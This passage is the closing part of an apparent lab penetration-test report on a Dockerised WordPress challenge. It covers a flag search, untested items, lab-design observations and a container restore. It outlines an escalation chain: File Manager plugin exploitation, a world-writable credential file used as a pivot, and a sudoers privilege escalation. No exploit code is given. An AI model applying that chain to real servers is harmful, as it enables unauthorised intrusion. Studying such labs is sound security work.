| Whole-filesystem filenames `*flag*` | **7** paths | `phpmyadmin/themes/bootstrap/img/flag.svg`, `flag-plus.svg`, perl `waitflags.ph` / `ss_flags.ph`, `mariadb/debian-10.11.flag`, two WP `icon-pointer-flag*.png` — all package assets |
| `wp_posts.post_content LIKE '%FLAG{%'` or `'%flag{%'` | **0** rows | Site has **0** published posts and **0** pages |
| `wp_options.option_value LIKE '%FLAG{%'` | **0** rows | — |
| `wp_users` login or email containing `flag` | **0** rows | 1 user total |
| `wp_options.option_name LIKE '%flag%'` | **1** row | `default_pingback_flag = 1` — a WordPress core option, not a reward |

The absence is a property of the artefact, not a position in a sequence. The
`FLAG{}` column of [`../INDEX.md`](../INDEX.md) is the single source for
reward status across the corpus; this lab's cell is `—`.

**Stated limitation of that search, because F8 proved it matters.** Every row
above is a **literal-pattern** search (`FLAG{`, `flag{`, `CTF{`, `*flag*`). F8
found a secret in this image that is **base64-encoded** and therefore invisible
to all of them. So the correct claim is *"no `FLAG{}` literal is present"*, not
*"no reward is present"*. I did not decode every file in the image and re-run the
pattern, and that sweep is listed below as untested rather than assumed clean.

---

## NOT tested vs discarded with reason

The two lists are kept apart above, per the runbook: *not tested* means no result
was obtained (a count of zero is **untested**), *discarded with reason* means a
result was obtained and thrown away. Five items are discarded with a reason and
seven are not tested. The most consequential line in either list is the first
entry of *NOT tested*: the class the platform's own description names was not
exploited, because the administrator password that gates it is not in the
artefact. The second is the decode-and-rescan in *Reward*, which F8 made
necessary.

---

## Lab-design observations

- **The declared class and the shipped plugin do not line up.** The description
  names "WordPress (plugin File Manager) exploitation". WP File Manager 7.2.9 is
  installed and active, and its own changelog for that version reads
  `* Trash Folder & Security Fixes.` (`readme.txt:144`) — i.e. the shipped version
  is the one carrying the security fix, and the connector is nonce-gated. The
  installed plugin is better defended than the description implies. The
  escalation the lab actually teaches is the `sudoers` line, and it is
  independent of WordPress entirely.
- **The plugin directory is owned by `root` while the rest of `wp-content` is
  `www-data`** — `wp-file-manage` is `drwxr-xr-x root root`, every other plugin
  is `www-data www-data`. Measured consequence: `www-data` **cannot** write to
  the plugin's own directory (1 of 4 write predicates denied, F2), so even a
  fully exploited File Manager could not rewrite the plugin that granted it. That
  is a property of how the lab author installed it by hand (visible in
  `/home/luisillo/.bash_history`), not a designed control.
- **Three vhosts, one of them named `wordpress` pointing at a directory named
  `wordpress`,** and the site's own canonical URLs are `http://escolares.dl/wordpress`
  (rewritten from `http://172.17.0.2` in `/root/.mysql_history:15`). Three names
  for one application is a trap for a flat wordlist, and it is the mirror image
  of lab 32's deception — here the names are honest.
- **The credential file is the whole puzzle.** A `0777` root-owned file holding
  one user's plaintext password, read by a `www-data` shell, is the intended
  pivot, and the intended first shell is the File Manager. Break either link and
  the lab has no path.

---

## Restore

Recreated from the image, not by undoing edits:

```
$ docker rm -f escolares_container && docker run -d --network=esc102net --name escolares_container escolares
172.21.0.2
```

Verified with a **positive** check — the service answering again, not the process
being alive:

```
GET /            http=200 bytes=6738
GET /wordpress/  http=200 bytes=84176
GET /phpmyadmin/ http=200 bytes=18605
```

And verified that no artefact of mine survived: `/root` is back to its six shipped
entries (`.bash_history .bashrc .local .mysql_history .profile .ssh`, the two
`ESC102_MARKER*` files are gone) and `/tmp` holds only `.secret.txt` — the six
probe files I `docker cp`'d in are gone with the container, and **`.secret.txt`
is not mine**: it is in the shipped image (F8), and a file another principal
created is not mine to delete, so it was left exactly as shipped. Finding it is
what produced F8; had I trusted an `ls /tmp` that I expected to be empty, I would
have deleted it and taken the finding with it.

Nothing outside this container and this engagement was touched, and no image,
network or volume belonging to any other lab was reclaimed.
